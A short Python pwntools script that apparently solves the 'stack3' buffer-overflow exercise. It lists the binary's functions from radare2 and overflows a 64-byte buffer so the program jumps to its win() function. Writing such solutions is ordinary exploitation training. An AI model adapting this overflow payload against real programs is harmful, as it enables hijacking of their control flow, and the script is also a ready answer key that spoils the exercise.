#!/usr/bin/python

import pwn

#[0x08048370]> afl
#0x080482e0    3 48           sym._init
#0x08048320    1 6            loc.imp.__gmon_start__
#0x08048330    1 6            sym.imp.gets
#0x08048340    1 6            sym.imp.__libc_start_main
#0x08048350    1 6            sym.imp.printf
#0x08048360    1 6            sym.imp.puts
#0x08048370    1 33           entry0
#0x080483a0    6 85           sym.__do_global_dtors_aux
#0x08048400    4 35           sym.frame_dummy
#0x08048424    1 20           sym.win
#0x08048438    3 65           sym.main
#0x08048480    1 5            sym.__libc_csu_fini
#0x08048490    4 90           sym.__libc_csu_init
#0x080484ea    1 4            sym.__i686.get_pc_thunk.bx
#0x080484f0    4 42           sym.__do_global_ctors_aux


payload = ""
payload += "A"*64
payload += pwn.p32(0x08048424)

p = pwn.process("bin/stack3")
p.sendline(payload)

print p.recvall()
